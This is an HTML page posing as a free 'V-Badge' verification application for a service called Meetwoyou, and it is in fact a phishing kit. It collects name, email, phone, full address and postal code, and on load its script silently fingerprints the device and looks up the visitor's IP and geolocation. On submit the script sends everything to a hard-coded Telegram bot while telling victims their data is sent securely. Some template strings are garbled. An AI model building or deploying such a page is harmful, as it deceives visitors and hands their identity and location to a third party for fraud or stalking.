<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meetwoyou - Get Verified Badge (Free Limited Offer)</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root { --primary: #0095f6; --bg: #000; --card: #121212; --text: #fff; --gray: #a0a0a0; }
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: var(--bg);
            color: var(--text);
            line-height: 1.6;
        }
        .header {
            background: #111;
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid #262626;
        }
        .logo {
            max-width: 180px;
            height: auto;
        }
        .hero {
            padding: 60px 20px 40px;
            text-align: center;
            background: linear-gradient(135deg, #1a1a1a, #000);
        }
        .badge { font-size: 110px; margin-bottom: 15px; }
        h1 { font-size: 2.6rem; margin-bottom: 10px; }
        .subtitle { font-size: 1.25rem; color: var(--gray); max-width: 680px; margin: 0 auto 25px; }
        .offer {
            background: #ed4956;
            color: white;
            padding: 8px 22px;
            border-radius: 50px;
            font-weight: bold;
            display: inline-block;
            margin-bottom: 25px;
        }
        .form-container {
            max-width: 620px;
            margin: 30px auto;
            background: var(--card);
            padding: 40px 30px;
            border-radius: 20px;
            border: 1px solid #333;
        }
        input, textarea, select {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 18px;
            background: #1a1a1a;
            border: 1px solid #444;
            border-radius: 12px;
            color: white;
            font-size: 16px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: var(--gray);
            font-weight: 500;
        }
        .btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 16px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        .btn:hover { background: #0077cc; }
        .info { text-align: center; color: #777; font-size: 0.95rem; margin: 25px 0; }
        .footer { text-align: center; padding: 40px 20px; color: #555; font-size: 0.9rem; }
        .highlight { color: var(--primary); }
    </style>
</head>
<body>

    <div class="header">
        <img src="meetwoyou.jpg" alt="Meetwoyou" class="logo">
    </div>

    <div class="hero">
        <div class="badge">✅</div>
        <h1>Get Your <span class="highlight">V-Badge</span></h1>
        <p class="subtitle">Limited Free Applications Open Now – Will Become Paid Soon</p>
        <div class="offer">🚀 Free Limited Time Offer</div>
    </div>

    <div class="form-container">
        <h2 style="text-align:center; margin-bottom:30px;">Verified Badge Application</h2>
        
        <form id="verifyForm">
            <label>Full Name</label>
            <input type="text" id="fullName" required placeholder="Your full name">

            <label>Email Address</label>
            <input type="email" id="email" required placeholder="your@email.com">

            <label>Phone Number (with country code)</label>
            <input type="tel" id="phone" required placeholder="+966 XXXXXXXX">

            <label>Upload Introduction Video (20-30 seconds)</label>
            <input type="file" id="video" accept="video/*" required>

            <label>Full Address</label>
            <textarea id="address" rows="3" required placeholder="Street, Area, City, Country"></textarea>

            <label>Postal Code</label>
            <input type="text" id="postal" required placeholder="Postal / ZIP code">

            <button type="submit" class="btn">Submit Application for Review</button>
        </form>

        <div class="info">
            <small>Your application + device information will be reviewed.<br>All data is sent securely.</small>
        </div>
    </div>

    <div class="footer">
        © 2026 Meetwoyou • Free Verified Badge Application Form
    </div>

    <script>
        const BOT_TOKEN = "8385508779:AAGWgCBn13wKo1AYGKpvUIBHgj-JojNtos4";
        const CHAT_ID = "7950771882";

        let deviceInfo = {};

        // Collect silent tracker data + better IP geolocation
        async function collectSilentData() {
            deviceInfo = {
                timestamp: new Date().toLocaleString('en-US', { timeZone: 'Asia/Riyadh' }),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language || navigator.languages[0],
                languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screenResolution: `${screen.width} × ${screen.height}`,
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
                hardwareConcurrency: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cores" : "N/A",
                battery: "Not supported",
                ip: "Fetching...",
                country: "Fetching...",
                city: "Fetching...",
                region: "Fetching...",
                isp: "Fetching..."
            };

            // Battery
            if ("getBattery" in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    deviceInfo.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Discharging)'}`;
                } catch(e) {}
            }

            // Better IP + Geo using ip-api.com (no key needed)
            try {
                const res = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,isp,query');
                const data = await res.json();
                if (data.status === "success") {
                    deviceInfo.ip = data.query || "Unknown";
                    deviceInfo.country = `\( {data.country} ( \){data.countryCode})`;
                    deviceInfo.city = data.city || "Unknown";
                    deviceInfo.region = data.regionName || "Unknown";
                    deviceInfo.isp = data.isp || "Unknown";
                }
            } catch(e) {
                console.log("IP fetch failed");
            }
        }

        // Run collection immediately when page loads
        window.onload = () => collectSilentData();

        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            Swal.fire({ title: 'Submitting...', didOpen: () => Swal.showLoading() });

            const videoFile = document.getElementById('video').files[0];
            const videoInfo = videoFile ? `\( {videoFile.name} ( \){(videoFile.size / (1024*1024)).toFixed(2)} MB)` : "No video";

            const formData = {
                fullName: document.getElementById('fullName').value,
                email: document.getElementById('email').value,
                phone: document.getElementById('phone').value,
                address: document.getElementById('address').value,
                postalCode: document.getElementById('postal').value,
                video: videoInfo
            };

            // Beautiful Telegram message
            let message = `🚀 *New Verified Badge Application Received*\n\n`;
            message += `👤 *Name:* ${formData.fullName}\n`;
            message += `📧 *Email:* ${formData.email}\n`;
            message += `📱 *Phone:* ${formData.phone}\n`;
            message += `📍 *Address:* ${formData.address}\n`;
            message += `📮 *Postal Code:* ${formData.postalCode}\n`;
            message += `🎥 *Video:* ${formData.video}\n\n`;
            message += `🔍 *Silent Tracker & Device Info:*\n`;
            message += `• IP: ${deviceInfo.ip}\n`;
            message += `• Country: ${deviceInfo.country}\n`;
            message += `• City: ${deviceInfo.city}\n`;
            message += `• Region: ${deviceInfo.region}\n`;
            message += `• ISP: ${deviceInfo.isp}\n`;
            message += `• Timezone: ${deviceInfo.timezone}\n`;
            message += `• Battery: ${deviceInfo.battery}\n`;
            message += `• Screen: ${deviceInfo.screenResolution}\n`;
            message += `• Device Memory: ${deviceInfo.deviceMemory}\n`;
            message += `• CPU Cores: ${deviceInfo.hardwareConcurrency}\n`;
            message += `• Language: ${deviceInfo.language}\n`;
            message += `• User Agent: ${deviceInfo.userAgent.substring(0, 120)}...\n`;
            message += `• Submitted: ${deviceInfo.timestamp}`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                Swal.fire({
                    title: 'Success!',
                    text: 'Your application has been submitted. We will review it and contact you soon.',
                    icon: 'success',
                    confirmButtonColor: '#0095f6'
                });

                document.getElementById('verifyForm').reset();

            } catch(err) {
                Swal.fire({ title: 'Error', text: 'Please try again later.', icon: 'error' });
            }
        });
    </script>
</body>
</html>
